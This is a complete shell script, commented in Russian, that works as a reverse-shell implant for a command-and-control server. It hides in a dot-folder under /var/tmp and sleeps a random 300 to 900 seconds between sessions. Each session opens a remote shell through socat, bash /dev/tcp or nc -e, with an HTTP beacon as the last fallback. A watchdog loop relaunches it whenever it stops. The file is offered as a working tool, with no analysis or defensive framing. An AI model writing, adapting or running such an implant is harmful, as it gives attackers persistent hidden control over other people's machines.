#!/bin/sh
# dialer.sh — raw-TCP канал к C2, модель как у них: короткая сессия, пауза 300–900 с.
# Роли: dial (ходит) и watch (перезапускает dial).
# Транспорт по убыванию: socat → bash /dev/tcp → nc -e → HTTP-поллинг (beacon.sh).
#
# Запуск: sh dialer.sh dial <host:port> [id]
#         sh dialer.sh watch

D=/var/tmp/.kf
ROLE="${1:-dial}"
EP="${2:-}"
ID="${3:-x}"
[ -f "$D/endpoint" ] && [ -z "$EP" ] && EP=$(cat "$D/endpoint" 2>/dev/null)

run_session() {
  host=${EP%%:*}
  port=${EP##*:}
  [ -n "$host" ] && [ -n "$port" ] && [ "$host" != "$port" ] || return 0
  printf '%s:%s' "$host" "$port" > "$D/endpoint" 2>/dev/null

  if command -v socat >/dev/null 2>&1; then
    timeout 240 socat -T 240 "TCP4:$host:$port" EXEC:/bin/sh,pty,stderr 2>/dev/null
    return 0
  fi
  if command -v bash >/dev/null 2>&1; then
    timeout 240 bash -c "exec 3<>/dev/tcp/$host/$port && sh <&3 >&3 2>&3" 2>/dev/null
    return 0
  fi
  if command -v nc >/dev/null 2>&1; then
    timeout 240 nc "$host" "$port" -e /bin/sh 2>/dev/null && return 0
  fi
  [ -x "$D/beacon.sh" ] && sh "$D/beacon.sh" "$ID" $(cat "$D/c2list" 2>/dev/null) 2>/dev/null
}

case "$ROLE" in
  watch)
    while :; do
      alm() { for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
      alm "$D/dialer.sh dial" || setsid sh "$D/dialer.sh" dial "$EP" "$ID" >/dev/null 2>&1 &
      sleep 15
    done ;;
  dial)
    while :; do
      j=$(od -An -N1 -tu1 /dev/urandom 2>/dev/null | tr -d ' \n')
      case "$j" in ''|*[!0-9]*) j=0 ;; esac
      sleep $(( 300 + j * 600 / 255 ))
      run_session
    done ;;
  *)
    echo "usage: $0 dial <host:port> [id] | watch" >&2
    exit 2 ;;
esac
